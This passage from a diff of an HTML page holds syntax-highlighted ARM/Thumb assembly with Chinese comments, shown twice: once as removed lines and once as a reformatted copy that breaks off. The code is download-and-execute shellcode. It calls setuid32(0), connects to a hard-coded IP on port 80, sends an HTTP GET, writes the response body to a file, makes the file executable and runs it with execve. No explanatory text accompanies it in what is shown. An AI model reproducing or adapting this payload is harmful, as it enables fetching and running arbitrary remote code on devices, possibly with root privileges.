-  </span><span style="color:#82aaff;">swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">fd = open(name</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">O_CREAT|O_WRONLY|O_TRUNC</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">S_IRWXU)</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r4</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r0</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">6 </span><span style="color:#82aaff;">@IPPROTO_TCP</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">1 </span><span style="color:#82aaff;">@SOCK_STREAM</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">2 </span><span style="color:#82aaff;">@AF_INET</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">250</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r7</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">31</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">@建立连接</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">sock = socket(AF_INET</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">SOCK_STREAM</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">IPPROTO_TCP)</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r5</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r0</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">16</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">adr r1</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">addr</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">250</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r7</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">33</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@connect(sock</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">addr</span><span style="color:#eeffff;">, </span><span style="color:#f78c6c;">16</span><span style="color:#82aaff;">)</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">@计算http头长度</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">adr r2</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">head</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">b L1</span><span style="color:#eeffff;">
-</span><span style="color:#82aaff;">L0:</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">1</span><span style="color:#eeffff;">
-</span><span style="color:#82aaff;">L1:</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">ldrb r0</span><span style="color:#eeffff;">, [</span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">]</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">cmp </span><span style="color:#82aaff;">r0</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">bne L0</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">sub </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r5</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">4</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@write(sock</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">head</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">strlen(head))</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">@跳过http头</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r3</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">adr r6</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">nrnr</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">ldr r6</span><span style="color:#eeffff;">, [</span><span style="color:#82aaff;">r6</span><span style="color:#eeffff;">]</span><span style="color:#eeffff;">
-</span><span style="color:#82aaff;">L2:</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">sub </span><span style="color:#f78c6c;">sp</span><span style="color:#eeffff;">, </span><span style="color:#f78c6c;">sp</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">, </span><span style="color:#f78c6c;">sp</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r5</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">3</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">push </span><span style="color:#82aaff;">{r3}</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">len = read(sock</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">buf</span><span style="color:#eeffff;">, </span><span style="color:#f78c6c;">252</span><span style="color:#82aaff;">)</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">pop </span><span style="color:#82aaff;">{r3}</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">cmp </span><span style="color:#82aaff;">r0</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">ble L7</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0</span><span style="color:#eeffff;">
-</span><span style="color:#82aaff;">L3:</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">lsl </span><span style="color:#82aaff;">r3</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r3</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">8</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">, </span><span style="color:#f78c6c;">sp</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">ldrb r1</span><span style="color:#eeffff;">, [</span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">]</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r3</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r3</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">1</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">cmp </span><span style="color:#82aaff;">r3</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r6</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">beq L4</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">cmp </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r0</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">bne L3</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#f78c6c;">sp</span><span style="color:#eeffff;">, </span><span style="color:#f78c6c;">sp</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">b L2</span><span style="color:#eeffff;">
-</span><span style="color:#82aaff;">L4:</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">, </span><span style="color:#f78c6c;">sp</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">sub </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r0</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">b L6</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">@写入文件</span><span style="color:#eeffff;">
-</span><span style="color:#82aaff;">L5:</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">sub </span><span style="color:#f78c6c;">sp</span><span style="color:#eeffff;">, </span><span style="color:#f78c6c;">sp</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">, </span><span style="color:#f78c6c;">sp</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r5</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">3</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">len = read(sock</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">buf</span><span style="color:#eeffff;">, </span><span style="color:#f78c6c;">252</span><span style="color:#82aaff;">)</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">cmp </span><span style="color:#82aaff;">r0</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">ble L7</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r0  </span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">, </span><span style="color:#f78c6c;">sp</span><span style="color:#eeffff;">
-</span><span style="color:#82aaff;">L6:  </span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r4</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">4</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@write(fd</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">buf</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">len)</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#f78c6c;">sp</span><span style="color:#eeffff;">, </span><span style="color:#f78c6c;">sp</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">b L5</span><span style="color:#eeffff;">
-</span><span style="color:#82aaff;">L7:</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#f78c6c;">sp</span><span style="color:#eeffff;">, </span><span style="color:#f78c6c;">sp</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">252</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r5</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">6 </span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@close(sock)</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">r4</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@close(fd)</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">@执行文件</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0x1C</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">lsl </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">4 </span><span style="color:#82aaff;">@S_IRUSR|S_IWUSR|S_IXUSR</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">adr r0</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">name</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">15</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@chmod(name</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">S_IRUSR|S_IWUSR|S_IXUSR)</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">push </span><span style="color:#82aaff;">{r1}</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">adr r0</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">name</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">push </span><span style="color:#82aaff;">{r0} @argv</span><span style="color:#eeffff;">[</span><span style="color:#f78c6c;">0</span><span style="color:#eeffff;">]</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span style="color:#eeffff;">, </span><span style="color:#f78c6c;">sp </span><span style="color:#82aaff;">@argv</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">11</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@execve(name</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">argv</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">NULL)</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0</span><span style="color:#eeffff;">
-  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span style="color:#eeffff;">, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">1</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@exit(</span><span style="color:#f78c6c;">0</span><span style="color:#82aaff;">)</span><span style="color:#eeffff;">
-</span><span style="color:#82aaff;">addr:</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">.short </span><span style="color:#f78c6c;">2 </span><span style="color:#82aaff;">@AF_INET</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">.ascii </span><span style="color:#c3e88d;">&quot;\x00\x50&quot; </span><span style="color:#82aaff;">@port</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">.byte </span><span style="color:#f78c6c;">202</span><span style="color:#eeffff;">, </span><span style="color:#f78c6c;">120</span><span style="color:#eeffff;">, </span><span style="color:#f78c6c;">2</span><span style="color:#eeffff;">, </span><span style="color:#f78c6c;">102 </span><span style="color:#82aaff;">@</span><span style="color:#f78c6c;">ip</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">.zero </span><span style="color:#f78c6c;">8</span><span style="color:#eeffff;">
-</span><span style="color:#82aaff;">head:</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">.ascii </span><span style="color:#c3e88d;">&quot;GET /&quot;</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">.ascii </span><span style="color:#c3e88d;">&quot;&quot; </span><span style="color:#82aaff;">@file</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">.ascii </span><span style="color:#c3e88d;">&quot; HTTP/1.1\r\n&quot;</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">.ascii </span><span style="color:#c3e88d;">&quot;HOST: &quot;</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">.ascii </span><span style="color:#c3e88d;">&quot;www.android.com&quot; </span><span style="color:#82aaff;">@host</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">.ascii </span><span style="color:#c3e88d;">&quot;\r\n\r\n\x00&quot;</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">.zero </span><span style="color:#f78c6c;">2</span><span style="color:#eeffff;">
-</span><span style="color:#82aaff;">name:</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">.asciz </span><span style="color:#c3e88d;">&quot;xxx&quot;</span><span style="color:#eeffff;">
-</span><span style="color:#82aaff;">nrnr:</span><span style="color:#eeffff;">
-  </span><span style="color:#82aaff;">.ascii </span><span style="color:#c3e88d;">&quot;\n\r\n\r&quot;</span><span style="color:#eeffff;">
-</span></code></pre><p>
+<pre data-lang="asm" style="background-color:#212121;color:#eeffff;" class="language-asm "><code class="language-asm" data-lang="asm"><span style="color:#82aaff;">.globl _start
+</span><span style="color:#82aaff;">.align </span><span style="color:#f78c6c;">2
+</span><span style="color:#82aaff;">_start:
+</span><span style="color:#82aaff;">.code </span><span style="color:#f78c6c;">32
+</span><span style="color:#82aaff;">  adr r0</span><span>, </span><span style="color:#82aaff;">thumb </span><span>+ </span><span style="color:#f78c6c;">1
+</span><span style="color:#82aaff;">  </span><span style="color:#f78c6c;">bx </span><span style="color:#82aaff;">r0
+</span><span style="color:#82aaff;">thumb:
+</span><span style="color:#82aaff;">.code </span><span style="color:#f78c6c;">16
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">213
+</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@setuid32(</span><span style="color:#f78c6c;">0</span><span style="color:#82aaff;">)
+</span><span style="color:#82aaff;">  @创建文件
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0x1C
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">lsl </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">4 </span><span style="color:#82aaff;">@S_IRWXU
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0x24
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">lsl </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">4
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">1 </span><span style="color:#82aaff;">@O_CREAT|O_WRONLY|O_TRUNC
+</span><span style="color:#82aaff;">  adr r0</span><span>, </span><span style="color:#82aaff;">name
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">5
+</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">fd = open(name</span><span>, </span><span style="color:#82aaff;">O_CREAT|O_WRONLY|O_TRUNC</span><span>, </span><span style="color:#82aaff;">S_IRWXU)
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r4</span><span>, </span><span style="color:#82aaff;">r0
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">6 </span><span style="color:#82aaff;">@IPPROTO_TCP
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">1 </span><span style="color:#82aaff;">@SOCK_STREAM
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">2 </span><span style="color:#82aaff;">@AF_INET
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">250
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">31
+</span><span style="color:#82aaff;">  @建立连接
+</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">sock = socket(AF_INET</span><span>, </span><span style="color:#82aaff;">SOCK_STREAM</span><span>, </span><span style="color:#82aaff;">IPPROTO_TCP)
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r5</span><span>, </span><span style="color:#82aaff;">r0
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">16
+</span><span style="color:#82aaff;">  adr r1</span><span>, </span><span style="color:#82aaff;">addr
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">250
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">33
+</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@connect(sock</span><span>, </span><span style="color:#82aaff;">addr</span><span>, </span><span style="color:#f78c6c;">16</span><span style="color:#82aaff;">)
+</span><span style="color:#82aaff;">  @计算http头长度
+</span><span style="color:#82aaff;">  adr r2</span><span>, </span><span style="color:#82aaff;">head
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r1</span><span>, </span><span style="color:#82aaff;">r2
+</span><span style="color:#82aaff;">  b L1
+</span><span style="color:#82aaff;">L0:
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">add </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">1
+</span><span style="color:#82aaff;">L1:
+</span><span style="color:#82aaff;">  ldrb r0</span><span>, [</span><span style="color:#82aaff;">r2</span><span>]
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">cmp </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">0
+</span><span style="color:#82aaff;">  bne L0
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">sub </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">r2</span><span>, </span><span style="color:#82aaff;">r1
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r0</span><span>, </span><span style="color:#82aaff;">r5
+</span><span style="color:#82aaff;">  </span><span style="font-style:italic;color:#c792ea;">mov </span><span style="color:#82aaff;">r7</span><span>, </span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">4
+</span><span style="color:#82aaff;">  swi #</span><span style="color:#f78c6c;">0 </span><span style="color:#82aaff;">@write(sock</span><span>, </span><span style="color:#82aaff;">head</span><span>, </span><span style="color:#82aaff;">strlen(head))
